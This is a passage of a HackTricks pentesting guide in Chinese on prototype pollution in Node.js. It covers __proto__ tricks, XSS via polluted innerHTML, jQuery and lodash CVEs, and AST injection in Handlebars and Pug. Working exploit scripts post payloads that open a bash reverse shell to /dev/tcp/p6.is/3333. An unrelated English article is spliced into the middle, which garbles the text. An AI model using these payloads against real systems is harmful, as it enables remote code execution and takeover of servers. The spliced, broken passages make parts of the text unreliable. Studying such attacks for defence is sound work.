# NodeJS - \_\_proto\_\_和原型污染

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## JavaScript中的对象 <a href="#053a" id="053a"></a>

首先，我们需要了解JavaScript中的`Object`。对象是一组键值对的集合，通常称为对象的属性。例如：

![](<../../../.gitbook/assets/image (389) (1).png>)

在JavaScript中，`Object`是一个基本对象，用于创建所有新创建的对象的模板。可以通过将`null`传递给`Object.create`来创建一个空对象。然而，新创建的对象也将具有与传递的参数相对应的类型，并继承所有基本属性。
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

之前我们学到，JavaScript中的对象是键值对的集合，所以一个`null`对象就是一个空字典：`{}`

## JavaScript中的函数/类 <a href="#55dd" id="55dd"></a>

在JavaScript中，类和函数的概念是相互关联的（函数本身充当类的构造函数，而实际上JavaScript没有“类”的概念）。让我们看下面的例子：
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)

# Node.js Proto Prototype Pollution

## Introduction

Prototype pollution is a vulnerability that occurs when an attacker can modify the prototype of an object and thereby manipulate the behavior of the target application. This vulnerability can lead to various security issues, such as remote code execution, denial of service, or data manipulation.

Node.js, being a popular runtime environment for JavaScript, is also susceptible to prototype pollution attacks. In this guide, we will explore the concept of prototype pollution in Node.js and discuss various techniques to exploit this vulnerability.

## Table of Contents

- [Understanding Prototype Pollution](#understanding-prototype-pollution)
- [Exploiting Prototype Pollution in Node.js](#exploiting-prototype-pollution-in-nodejs)
  - [Polluting the Prototype](#polluting-the-prototype)
  - [Exploiting the Polluted Prototype](#exploiting-the-polluted-prototype)
- [Preventing Prototype Pollution](#preventing-prototype-pollution)
- [Conclusion](#conclusion)

## Understanding Prototype Pollution

Prototype pollution occurs when an attacker can modify the prototype of an object. In JavaScript, objects are created based on prototypes, which act as blueprints for creating new objects. By modifying the prototype, an attacker can introduce malicious properties or methods that will be inherited by all objects created from that prototype.

This vulnerability can be exploited in various ways, depending on the context and the specific behavior of the target application. Some common attack scenarios include:

- Modifying built-in JavaScript objects, such as `Object`, `Array`, or `Function`.
- Manipulating the behavior of third-party libraries or modules.
- Injecting malicious code into the application's execution flow.

## Exploiting Prototype Pollution in Node.js

Node.js applications are also vulnerable to prototype pollution attacks. In this section, we will explore how an attacker can exploit prototype pollution in a Node.js application.

### Polluting the Prototype

To exploit prototype pollution in Node.js, an attacker needs to find a vulnerable function that allows modifying the prototype of an object. This can be achieved by identifying user-controlled input that is directly used to extend an object's prototype.

Once the vulnerable function is identified, the attacker can craft a payload that modifies the prototype of an object. This payload typically includes a property with a specially crafted name and value that will be added to the object's prototype.

### Exploiting the Polluted Prototype

After successfully polluting the prototype, the attacker can trigger the exploitation by performing actions that rely on the polluted behavior. This can include calling functions or methods that use the polluted object, or manipulating the application's flow to execute the malicious code introduced through prototype pollution.

The impact of the exploitation depends on the specific context and behavior of the target application. It can range from remote code execution to denial of service or data manipulation.

## Preventing Prototype Pollution

To prevent prototype pollution attacks in Node.js applications, it is important to follow secure coding practices and implement proper input validation and sanitization. Here are some recommendations to mitigate the risk of prototype pollution:

- Avoid using user-controlled input to extend an object's prototype.
- Implement strict input validation and sanitization to prevent malicious input from being processed.
- Regularly update and patch third-party libraries to ensure they are not vulnerable to prototype pollution.
- Use security tools and frameworks that can detect and prevent prototype pollution vulnerabilities.

## Conclusion

Prototype pollution is a serious vulnerability that can lead to various security issues in Node.js applications. By understanding the concept of prototype pollution and implementing proper security measures, developers can mitigate the risk of exploitation and ensure the integrity and security of their applications.
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## JavaScript中的原型 <a href="#3843" id="3843"></a>

需要注意的一点是，在执行代码时，原型属性可以被更改/修改/删除。例如，可以动态添加类的函数：

![](<../../../.gitbook/assets/image (363).png>)

类的函数也可以被修改（例如`toString`或`valueOf`的以下情况）：

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## 继承

在基于原型的程序中，对象从类中继承属性/方法。这些类是通过将属性/方法添加到另一个类的实例或将它们添加到空对象中来派生的。

请注意，如果您向用作一组对象的原型的对象（如myPersonObj）添加属性，则它作为原型的对象也会获得新属性，但该属性不会被打印，除非特别调用。

![](<../../../.gitbook/assets/image (366).png>)

## \_\_proto\_\_污染 <a href="#0d0a" id="0d0a"></a>

您应该已经了解到**JavaScript中的每个对象只是键值对的集合**，并且**每个对象都继承自JavaScript中的Object类型**。这意味着，如果您能够污染Object类型，**环境中的每个JavaScript对象都将被污染！**

这相当简单，您只需要能够修改任意JavaScript对象的一些属性（键值对），因为每个对象都继承自Object，所以每个对象都可以访问Object的结构。
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
从前面的例子中，可以使用以下方法访问Object的结构：
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
所以，正如之前提到的，如果现在向对象方案中添加了一个属性，每个JavaScript对象都将可以访问到这个新属性：
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
所以现在每个JS对象都将包含新的属性：函数`printHello`和新的常量`globalconstant`

## 原型污染

这种技术不像之前的那种有效，因为你无法污染JS对象的结构。但是在禁止使用关键字`__proto__`的情况下，这种技术可以很有用。

如果你能够修改函数的属性，你可以修改函数的`prototype`属性，**在这里添加的每个新属性都将被从该函数创建的每个对象继承：**
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
在这种情况下，只有从`person`类创建的**对象**会受到影响，但它们每个都会继承`sayHello`和`newConstant`属性。

**有两种方法可以滥用原型污染来污染每个JS对象。**

第一种方法是污染**Object**的原型属性（正如之前提到的，每个JS对象都继承自它）：
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
如果你成功做到这一点，每个JS对象都将能够执行函数`sayBye`。

另一种方法是污染字典变量的构造函数的原型，就像下面的例子中所示：
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
在执行该代码后，**每个JS对象都将能够执行函数`sayHey`**。

## 污染其他对象

### 从类到Object.prototype

在一个你可以**污染特定对象**并且需要**访问`Object.prototype`**的场景中，你可以使用以下代码进行搜索：
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### 数组元素污染

请注意，由于您可以在JS中污染对象的属性，如果您可以污染一个数组，您也可以通过索引访问并污染数组的值（请注意，您无法覆盖值，因此您需要污染某种程度上被使用但未被写入的索引）。
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### HTML元素污染

通过JS生成HTML元素时，可以通过**覆盖** **`innerHTML`** 属性来编写**任意的HTML代码**。[这篇文章的想法和示例](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/)。

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## 示例

### 基本示例

那么原型污染在哪里呢？当应用程序存在错误时，可以覆盖`Object.prototype`的属性，从而导致原型污染。由于每个典型对象都从`Object.prototype`继承其属性，我们可以改变应用程序的行为。最常见的示例是以下内容：
```javascript
if (user.isAdmin) {   // do something important!}
```
假设我们有一个原型污染，可以设置`Object.prototype.isAdmin = true`。那么，除非应用程序明确分配了任何值，否则`user.isAdmin`始终为true！

例如，`obj[a][b] = value`。如果攻击者可以控制`a`和`value`的值，那么他只需要将`a`的值调整为`__proto__`（在JavaScript中，`obj["__proto__"]`和`obj.__proto__`是完全等价的），然后应用程序中所有现有对象的属性`b`将被分配为`value`。

然而，攻击并不像上面的那个简单，根据[论文](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf)所述，只有满足以下三个条件之一时，我们才能进行攻击：

* 执行递归合并
* 通过路径定义属性
* 克隆对象

### 覆盖函数
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto污染到RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## 客户端原型污染到XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019–11358: 通过jQuery $ .extend进行原型污染攻击

如果处理不当，$ .extend可以更改对象`prototype`（应用程序中对象的模板）的属性。然后，该属性将出现在所有对象上。请注意，只有$ .extend的“深层”版本（即g）受到影响。

程序员经常使用此函数来复制对象或从默认对象中填充新属性。例如：

我们可以想象`myObject`是来自用户的输入字段，并将其序列化到数据库中。

在这段代码中，我们经常认为在运行时将属性`isAdmin`分配给新创建的对象。但实际上，它直接分配给`{}`，然后`{}.isAdmin`将为`true`。如果在此代码之后，我们执行以下检查：
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
如果用户尚不存在（`undefined`），则将在其父对象中搜索属性`isAdmin`，该父对象是在上面添加了值为`true`的`isAdmin`的对象。

在JQuery 3.3.1上执行的另一个示例：
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
这些错误可能会影响很多JavaScript项目，尤其是NodeJS项目，最实际的例子是在2018年12月发生的Mongoose错误，这是一个帮助操作MongoDB的JS库。

### CVE-2018–3721, CVE-2019–10744: 通过lodash进行原型污染攻击

[Lodash](https://www.npmjs.com/package/lodash)也是一个众所周知的库，提供了许多不同的函数，帮助我们更方便、更整洁地编写代码，每周下载量超过1900万次。它也遇到了与JQuery相同的问题。

**CVE-2018–3721**

**CVE-2019–10744**

这个漏洞影响了所有版本的Lodash，在4.17.11版本中已经修复。

### 另一个带有CVE的教程

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## AST原型污染

在NodeJS中，AST在JS中经常被使用，比如模板引擎和TypeScript等。\
对于模板引擎，结构如上图所示。

![img](https://blog.p6.is/img/2020/08/graph\_3.jpg)

### Handlebars

信息来自[https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

您可以将任何字符串插入到`Object.prototype.pendingContent`中，以确定是否存在攻击的可能性。\
这样可以确保在黑盒环境中存在原型污染时，服务器正在使用handlebars引擎。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
if (this.pendingContent) {
content = this.pendingContent + content;
} else {
this.pendingLocation = this.source.currentLocation;
}

this.pendingContent = content;
},
pushSource: function pushSource(source) {
if (this.pendingContent) {
this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
this.pendingContent = undefined;
}

if (source) {
this.source.push(source);
}
}
...
```
这是`javascript-compiler.js`文件中的`appendContent`函数实现的。`appendContent`函数的功能是，如果`pendingContent`存在，则将其附加到内容中并返回。

`pushSource`函数将`pendingContent`设置为`undefined`，以防止字符串被多次插入。

**利用方法**

![img](https://blog.p6.is/img/2020/08/graph\_5.jpg)

如上图所示，Handlebars的工作原理。

在词法分析器和解析器生成AST之后，AST会传递给`compiler.js`。我们可以使用一些参数运行编译器生成的模板函数，并且它会返回类似于“Hello posix”的字符串（当msg为posix时）。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
break;
```
handlebars中的解析器通过Number构造函数强制将类型为NumberLiteral的节点的值始终为数字。然而，您可以使用原型污染在此处插入一个非数字字符串。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
// Just return if an already-compiled AST was passed in.
if (input.type === 'Program') {
return input;
}

_parser2['default'].yy = yy;

// Altering the shared object here, but this is ok as parser is a sync operation
yy.locInfo = function (locInfo) {
return new yy.SourceLocation(options && options.srcName, locInfo);
};

var ast = _parser2['default'].parse(input);

return ast;
}

function parse(input, options) {
var ast = parseWithoutProcessing(input, options);
var strip = new _whitespaceControl2['default'](options);

return strip.accept(ast);
}
```
首先，看一下编译函数，它支持两种输入方式，AST 对象和模板字符串。

当输入的类型是 `Program` 时，尽管实际上输入的值是字符串。\
解析器认为它已经由 parser.js 解析成 AST，并将其直接发送给编译器，无需进行任何处理。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
/* istanbul ignore next: Sanity code */
if (!this[node.type]) {
throw new _exception2['default']('Unknown type: ' + node.type, node);
}

this.sourceNode.unshift(node);
var ret = this[node.type](node);
this.sourceNode.shift();
return ret;
},
Program: function Program(program) {
console.log((new Error).stack)
this.options.blockParams.unshift(program.blockParams);

var body = program.body,
bodyLength = body.length;
for (var i = 0; i < bodyLength; i++) {
this.accept(body[i]);
}

this.options.blockParams.shift();

this.isSimple = bodyLength === 1;
this.blockParams = program.blockParams ? program.blockParams.length : 0;

return this;
}
```
编译器将AST对象（实际上是一个字符串）发送给`accept`方法。\
`accept`调用编译器的`this[node.type]`。\
然后，使用AST的`body`属性来构建函数。
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
return parent[propertyName];
}
return undefined
};

return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
"name": "undefined",
"hash": {},
"data": data,
"loc": {
"start": 0,
"end": 0
}
})) != null ? stack1 : "");
}
*/
```
作为结果，可以配置如下的攻击。如果你已经通过解析器，指定一个不能被赋值给NumberLiteral值的字符串。但是注入的AST被处理后，我们可以将任何代码插入到函数中。

**示例**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
### Pug

更多信息请参考[https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
## 我可以做什么来预防？

* 使用 `Object.freeze (Object.prototype)` 冻结属性
* 根据应用程序的模式对 JSON 输入进行验证
* 避免以不安全的方式使用递归合并函数
* 使用没有原型属性的对象，例如 `Object.create(null)`，以避免影响原型链
* 使用 `Map` 而不是 `Object`
* 定期更新库的新补丁

## 参考资料

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？想要在 HackTricks 中 **宣传你的公司** 吗？或者想要获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者在 **Twitter** 上 **关注** 我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
